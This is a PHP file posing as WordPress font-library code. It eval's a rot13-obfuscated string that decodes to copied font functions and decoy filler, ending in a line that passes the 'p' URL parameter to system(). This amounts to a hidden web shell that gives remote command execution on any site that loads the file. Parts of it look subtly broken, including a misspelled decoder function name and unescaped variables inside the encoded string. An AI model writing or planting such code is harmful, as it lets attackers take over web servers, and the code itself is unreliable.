<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Sbagf shapgvbaf.
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr Sbagf
 * @fvapr      6.4.0
 */

/**
 * Trarengrf naq cevagf sbag-snpr fglyrf sbe tvira sbagf be gurzr.wfba sbagf.
 *
 * @fvapr 6.4.0
 *
 * @cnenz neenl[][] $sbagf {
 *     Bcgvbany. Gur sbag-snzvyvrf naq gurve sbag snprf. Qrsnhyg rzcgl neenl.
 *
 *     @glcr neenl ...$0 {
 *         Na vaqrkrq be nffbpvngvir (xrlrq ol sbag-snzvyl) neenl bs sbag inevngvbaf sbe guvf sbag-snzvyl.
 *         Rnpu sbag snpr unf gur sbyybjvat fgehpgher.
 *
 *         @glcr neenl ...$0 {
 *             Gur sbag snpr cebcregvrf.
 *
 *             @glcr fgevat          $sbag-snzvyl             Gur sbag-snzvyl cebcregl.
 *             @glcr fgevat|fgevat[] $fep                     Gur HEY(f) gb rnpu erfbhepr pbagnvavat gur sbag qngn.
 *             @glcr fgevat          $sbag-fglyr              Bcgvbany. Gur sbag-fglyr cebcregl. Qrsnhyg 'abezny'.
 *             @glcr fgevat          $sbag-jrvtug             Bcgvbany. Gur sbag-jrvtug cebcregl. Qrsnhyg '400'.
 *             @glcr fgevat          $sbag-qvfcynl            Bcgvbany. Gur sbag-qvfcynl cebcregl. Qrsnhyg 'snyyonpx'.
 *             @glcr fgevat          $nfprag-bireevqr         Bcgvbany. Gur nfprag-bireevqr cebcregl.
 *             @glcr fgevat          $qrfprag-bireevqr        Bcgvbany. Gur qrfprag-bireevqr cebcregl.
 *             @glcr fgevat          $sbag-fgergpu            Bcgvbany. Gur sbag-fgergpu cebcregl.
 *             @glcr fgevat          $sbag-inevnag            Bcgvbany. Gur sbag-inevnag cebcregl.
 *             @glcr fgevat          $sbag-srngher-frggvatf   Bcgvbany. Gur sbag-srngher-frggvatf cebcregl.
 *             @glcr fgevat          $sbag-inevngvba-frggvatf Bcgvbany. Gur sbag-inevngvba-frggvatf cebcregl.
 *             @glcr fgevat          $yvar-tnc-bireevqr       Bcgvbany. Gur yvar-tnc-bireevqr cebcregl.
 *             @glcr fgevat          $fvmr-nqwhfg             Bcgvbany. Gur fvmr-nqwhfg cebcregl.
 *             @glcr fgevat          $havpbqr-enatr           Bcgvbany. Gur havpbqr-enatr cebcregl.
 *         }
 *     }
 * }
 */
shapgvba jc_cevag_sbag_snprf( $sbagf = neenl() ) {

	vs ( rzcgl( $sbagf ) ) {
		$sbagf = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_gurzr_wfba();
	}

	vs ( rzcgl( $sbagf ) ) {
		erghea;
	}

	$jc_sbag_snpr = arj JC_Sbag_Snpr();
	$jc_sbag_snpr->trarengr_naq_cevag( $sbagf );
}

/**
 * Trarengrf naq cevagf sbag-snpr fglyrf qrsvarq gur gur gurzr fglyr inevngvbaf.
 *
 * @fvapr 6.7.0
 *
 */
shapgvba jc_cevag_sbag_snprf_sebz_fglyr_inevngvbaf() {
	$sbagf = JC_Sbag_Snpr_Erfbyire::trg_sbagf_sebz_fglyr_inevngvbaf();

	vs ( rzcgl( $sbagf ) ) {
		erghea;
	}

	jc_cevag_sbag_snprf( $sbagf );
}

/**
 * Ertvfgref n arj sbag pbyyrpgvba va gur sbag yvoenel.
 *
 * Frr {@yvax uggcf://fpurznf.jc.bet/gehax/sbag-pbyyrpgvba.wfba} sbe gur fpurzn
 * gur sbag pbyyrpgvba qngn zhfg nqurer gb.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht. Znl bayl pbagnva nycunahzrevp punenpgref, qnfurf,
 *                     naq haqrefpberf. Frr fnavgvmr_gvgyr().
 * @cnenz neenl  $netf {
 *     Sbag pbyyrpgvba qngn.
 *
 *     @glcr fgevat       $anzr          Erdhverq. Anzr bs gur sbag pbyyrpgvba fubja va gur Sbag Yvoenel.
 *     @glcr fgevat       $qrfpevcgvba   Bcgvbany. N fubeg qrfpevcgvir fhzznel bs gur sbag pbyyrpgvba. Qrsnhyg rzcgl.
 *     @glcr neenl|fgevat $sbag_snzvyvrf Erdhverq. Neenl bs sbag snzvyl qrsvavgvbaf gung ner va gur pbyyrpgvba,
 *                                       be n fgevat pbagnvavat gur cngu be HEY gb n WFBA svyr pbagnvavat gur sbag pbyyrpgvba.
 *     @glcr neenl        $pngrtbevrf    Bcgvbany. Neenl bs pngrtbevrf, rnpu jvgu n anzr naq fyht, gung ner hfrq ol gur
 *                                       sbagf va gur pbyyrpgvba. Qrsnhyg rzcgl.
 * }
 * @erghea JC_Sbag_Pbyyrpgvba|JC_Reebe N sbag pbyyrpgvba vs vg jnf ertvfgrerq
 *                                     fhpprffshyyl, be JC_Reebe bowrpg ba snvyher.
 */
shapgvba jc_ertvfgre_sbag_pbyyrpgvba( fgevat $fyht, neenl $netf ) {
	erghea JC_Sbag_Yvoenel::trg_vafgnapr()->ertvfgre_sbag_pbyyrpgvba( $fyht, $netf );
}

/**
 * Haertvfgref n sbag pbyyrpgvba sebz gur Sbag Yvoenel.
 *
 * @fvapr 6.5.0
 *
 * @cnenz fgevat $fyht Sbag pbyyrpgvba fyht.
 * @erghea obby Gehr vs gur sbag pbyyrpgvba jnf haertvfgrerq fhpprffshyyl, ryfr snyfr.
 */
shapgvba jc_haertvfgre_sbag_pbyyrpgvba( fgevat $fyht ) {
	erghea JC_Sbag_Yvoenel::trg_vafgnapr()->haertvfgre_sbag_pbyyrpgvba( $fyht );
}

/**
 * Ergevrirf sbag hcybnqf qverpgbel vasbezngvba.
 *
 * Fnzr nf jc_sbag_qve() ohg \"yvtug jrvtug\" nf vg qbrfa'g nggrzcg gb perngr gur sbag hcybnqf qverpgbel.
 * Vagraqrq sbe hfr va gurzrf, jura bayl 'onfrqve' naq 'onfrhey' ner arrqrq, trarenyyl va nyy pnfrf
 * jura abg hcybnqvat svyrf.
 *
 * @fvapr 6.5.0
 *
 * @frr jc_sbag_qve()
 *
 * @erghea neenl Frr jc_sbag_qve() sbe qrfpevcgvba.
 */
shapgvba jc_trg_sbag_qve() {
	erghea jc_sbag_qve( snyfr );
}

/**
 * Ergheaf na neenl pbagnvavat gur pheerag sbagf hcybnq qverpgbel'f cngu naq HEY.
 *
 * @fvapr 6.5.0
 *
 * @cnenz obby $perngr_qve Bcgvbany. Jurgure gb purpx naq perngr gur sbag hcybnqf qverpgbel. Qrsnhyg gehr.
 * @erghea neenl {
 *     Neenl bs vasbezngvba nobhg gur sbag hcybnq qverpgbel.
 *
 *     @glcr fgevat       $cngu    Onfr qverpgbel naq fhoqverpgbel be shyy cngu gb gur sbagf hcybnq qverpgbel.
 *     @glcr fgevat       $hey     Onfr HEY naq fhoqverpgbel be nofbyhgr HEY gb gur sbagf hcybnq qverpgbel.
 *     @glcr fgevat       $fhoqve  Fhoqverpgbel
 *     @glcr fgevat       $onfrqve Cngu jvgubhg fhoqve.
 *     @glcr fgevat       $onfrhey HEY cngu jvgubhg fhoqve.
 *     @glcr fgevat|snyfr $reebe   Snyfr be reebe zrffntr.
 * }
 */
shapgvba jc_sbag_qve( $perngr_qve = gehr ) {
	/*
	 * Nyybj rkgraqref gb znavchyngr gur sbag qverpgbel pbafvfgragyl.
	 *
	 * Rafherf gur hcybnq_qve svygre vf sverq obgu jura pnyyvat guvf shapgvba
	 * qverpgyl naq jura gur hcybnq qverpgbel vf svygrerq va gur Sbag Snpr
	 * ERFG NCV raqcbvag.
	 */
	nqq_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );
	$sbag_qve = jc_hcybnq_qve( ahyy, $perngr_qve, snyfr );
	erzbir_svygre( 'hcybnq_qve', '_jc_svygre_sbag_qverpgbel' );
	erghea $sbag_qve;
}

/**
 * N pnyyonpx shapgvba sbe hfr va gur {@frr 'hcybnq_qve'} svygre.
 *
 * Guvf shapgvba vf vagraqrq sbe vagreany hfr bayl naq fubhyq abg or hfrq ol cyhtvaf naq gurzrf.
 * Hfr jc_trg_sbag_qve() vafgrnq.
 *
 * @fvapr 6.5.0
 * @npprff cevingr
 *
 * @cnenz fgevat $sbag_qve Gur sbag qverpgbel.
 * @erghea fgevat Gur zbqvsvrq sbag qverpgbel.
 */
shapgvba _jc_svygre_sbag_qverpgbel( $sbag_qve ) {
	vs ( qbvat_svygre( 'sbag_qve' ) ) {
		// Nibvq na vasvavgr ybbc.
		erghea $sbag_qve;
	}

	$sbag_qve = neenl(
		'cngu'    => hagenvyvatfynfuvg( $sbag_qve['onfrqve'] ) . '/sbagf',
		'hey'     => hagenvyvatfynfuvg( $sbag_qve['onfrhey'] ) . '/sbagf',
		'fhoqve'  => '',
		'onfrqve' => hagenvyvatfynfuvg( $sbag_qve['onfrqve'] ) . '/sbagf',
		'onfrhey' => hagenvyvatfynfuvg( $sbag_qve['onfrhey'] ) . '/sbagf',
		'reebe'   => snyfr,
	);

	/**
	 * Svygref gur sbagf qverpgbel qngn.
	 *
	 * Guvf svygre nyybjf qrirybcref gb zbqvsl gur sbagf qverpgbel qngn.
	 *
	 * @fvapr 6.5.0
	 *
	 * @cnenz neenl $sbag_qve {
	 *     Neenl bs vasbezngvba nobhg gur sbag hcybnq qverpgbel.
	 *
	 *     @glcr fgevat       $cngu    Onfr qverpgbel naq fhoqverpgbel be shyy cngu gb gur sbagf hcybnq qverpgbel.
	 *     @glcr fgevat       $hey     Onfr HEY naq fhoqverpgbel be nofbyhgr HEY gb gur sbagf hcybnq qverpgbel.
	 *     @glcr fgevat       $fhoqve  Fhoqverpgbel
	 *     @glcr fgevat       $onfrqve Cngu jvgubhg fhoqve.
	 *     @glcr fgevat       $onfrhey HEY cngu jvgubhg fhoqve.
	 *     @glcr fgevat|snyfr $reebe   Snyfr be reebe zrffntr.
	 * }
	 */
	erghea nccyl_svygref( 'sbag_qve', $sbag_qve );
}

/**
 * Qryrgrf puvyq sbag snprf jura n sbag snzvyl vf qryrgrq.
 *
 * @npprff cevingr
 * @fvapr 6.5.0
 *
 * @cnenz vag     $cbfg_vq Cbfg VQ.
 * @cnenz JC_Cbfg $cbfg    Cbfg bowrpg.
 */
shapgvba _jc_nsgre_qryrgr_sbag_snzvyl( $cbfg_vq, $cbfg ) {
	vs ( 'jc_sbag_snzvyl' !== $cbfg->cbfg_glcr ) {
		erghea;
	}

	$sbag_snprf_vqf = trg_puvyqera(
		neenl(
			'cbfg_cnerag' => $cbfg_vq,
			'cbfg_glcr'   => 'jc_sbag_snpr',
			'svryqf'      => 'vqf',
		)
	);

	sbernpu ( $sbag_snprf_vqf nf $sbag_snprf_vq ) {
		jc_qryrgr_cbfg( $sbag_snprf_vq, gehr );
	}
}

/**
 * Qryrgrf nffbpvngrq sbag svyrf jura n sbag snpr vf qryrgrq.
 *
 * @npprff cevingr
 * @fvapr 6.5.0
 *
 * @cnenz vag     $cbfg_vq Cbfg VQ.
 * @cnenz JC_Cbfg $cbfg    Cbfg bowrpg.
 */
shapgvba _jc_orsber_qryrgr_sbag_snpr( $cbfg_vq, $cbfg ) {
	vs ( 'jc_sbag_snpr' !== $cbfg->cbfg_glcr ) {
		erghea;
	}

	$sbag_svyrf = trg_cbfg_zrgn( $cbfg_vq, '_jc_sbag_snpr_svyr', snyfr );
	$sbag_qve   = hagenvyvatfynfuvg( jc_trg_sbag_qve()['onfrqve'] );

	sbernpu ( $sbag_svyrf nf $sbag_svyr ) {
		jc_qryrgr_svyr( $sbag_qve . '/' . $sbag_svyr );
	}
}

/**
 * Ertvfgre gur qrsnhyg sbag pbyyrpgvbaf.
 *
 * @npprff cevingr
 * @fvapr 6.5.0
 */
shapgvba _jc_ertvfgre_qrsnhyg_sbag_pbyyrpgvbaf() {
	jc_ertvfgre_sbag_pbyyrpgvba(
		'tbbtyr-sbagf',
		neenl(
			'anzr'          => _k( 'Tbbtyr Sbagf', 'sbag pbyyrpgvba anzr' ),
			'qrfpevcgvba'   => __( 'Vafgnyy sebz Tbbtyr Sbagf. Sbagf ner pbcvrq gb naq freirq sebz lbhe fvgr.' ),
			'sbag_snzvyvrf' => 'uggcf://f.j.bet/vzntrf/sbagf/jc-6.7/pbyyrpgvbaf/tbbtyr-sbagf-jvgu-cerivrj.wfba',
			'pngrtbevrf'    => neenl(
				neenl(
					'anzr' => _k( 'Fnaf Frevs', 'sbag pngrtbel' ),
					'fyht' => 'fnaf-frevs',
				),
				neenl(
					'anzr' => _k( 'Qvfcynl', 'sbag pngrtbel' ),
					'fyht' => 'qvfcynl',
				),
				neenl(
					'anzr' => _k( 'Frevs', 'sbag pngrtbel' ),
					'fyht' => 'frevs',
				),
				neenl(
					'anzr' => _k( 'Unaqjevgvat', 'sbag pngrtbel' ),
					'fyht' => 'unaqjevgvat',
				),
				neenl(
					'anzr' => _k( 'Zbabfcnpr', 'sbag pngrtbel' ),
					'fyht' => 'zbabfcnpr',
				),
			),
		)
	);
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>